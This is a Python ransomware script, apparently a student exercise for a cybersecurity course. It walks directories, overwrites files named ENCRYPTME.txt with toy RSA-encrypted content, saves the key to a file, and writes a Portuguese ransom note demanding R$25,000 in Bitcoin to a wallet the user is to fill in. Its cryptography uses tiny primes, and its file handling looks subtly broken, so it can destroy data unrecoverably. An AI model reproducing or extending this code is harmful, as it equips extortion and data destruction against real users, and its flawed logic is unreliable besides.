'''
FIAP
Defesa Cibernética
Development & Coding for Security

Prof. Ms. Fábio H. Cabrini
Atividade: Check Point 4
Alunos
Carlos Washington de Jesus - RM87187
Gustavo Martins Khairalla - RM87101
'''

# Modules:
from base64 import b64decode, b64encode
from math import gcd
import os
from random import randrange, choice

# Main code:
def primes():
    ''' Retorna dois valores primos aleatórios de uma lista pré-definida '''
    prime_numbers = [
        2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41,
        43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97
    ]
    return choice(prime_numbers), choice(prime_numbers)

def phi(p, q):
    ''' Função Totient de Euler '''
    return (p -1) * (q -1)

def generate_pubkey(totient):
    ''' A maioria das implementações online utiliza o mesmo valor fixado '''
    # while True:
    #     exponent = randrange(2, totient)
    #     if gcd(totient, exponent) == 1:
    #         return exponent
    return int('0x10001', 0) # 65537

def generate_privkey(totient, e):
    exponent = 0
    while exponent * e % totient != 1:
        exponent += 1
    return exponent

def encrypt_files(filepath, e, n):
    ''' Sobreescreve os arquivos com dados criptografados '''
    with open(filepath, 'rb+') as file:
        _data = file.read().decode()
        open(filepath, 'w').close()     # Limpa arquivo
        file.write(b64encode(''.join(chr(ord(letter) ** e % n) for letter in _data).encode()))
        
def decrypt_files(filepath, d, n):
    ''' Sobreescreve os arquivos com os dados originais '''
    with open(filepath, 'rb+') as file:
        _data = b64decode(file.read()).decode()
        open(filepath, 'w').close()     # Limpa arquivo 
        file.write(''.join(chr(ord(letter) ** int(d) % int(n)) for letter in _data).encode())

def output_key(d, n):
    ''' Salva chave de descriptografia em arquivo externo '''
    with open('DECRYPTION_KEY.txt', 'w') as file:
        privkey = b64encode((str(d)+','+str(n)).encode()).decode()

        file.write(f'----- BEGIN RSA PRIVATE KEY -----\n{privkey}\n----- END RSA PRIVATE KEY -----\n')

def ransom():
    with open('LEIAME.txt', 'w') as file:
        BTC_ADDRESS = ''    # Sua carteira Bitcoin
        message = f'''Infelizmente seus arquivos estão inacessíveis, recomendamos que não tente manipular os arquivos de nenhuma forma
uma vez que isso pode acarretar na perda irreversível do arquivo. Para recuperar os arquivos perdidos, envie o
equivalente à R$ 25.000 em Bitcoins para a carteira: {BTC_ADDRESS if BTC_ADDRESS else None} 
'''
        file.write(message)

def main(encrypted=False, key=None):

    ''' Variáveis para RSA '''
    if key:
        d, n = b64decode(key).decode().split(',')
    else:
        p, q = primes()
        n = p * q
        totient = phi(p, q)
        e = generate_pubkey(totient)
        d = generate_privkey(totient, e)

    ''' Envia chave pra arquivo '''
    output_key(d, n)
    
    ''' Busca por arquivos no sistema '''
    for root, _, files in os.walk('.'):
        for file in files:
            if 'ENCRYPTME.txt' in file:     # Arquivo pra testes
                filepath = os.path.join(root, file)

                encrypt_files(filepath, e, n) if not encrypted else decrypt_files(filepath, d, n)

    ''' Cria mensagem de ransom '''
    ransom()

if __name__ == '__main__':
    
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('--decrypt', dest='key')
    args = parser.parse_args()

    if args.key:
        main(True, args.key)
    else:
        main()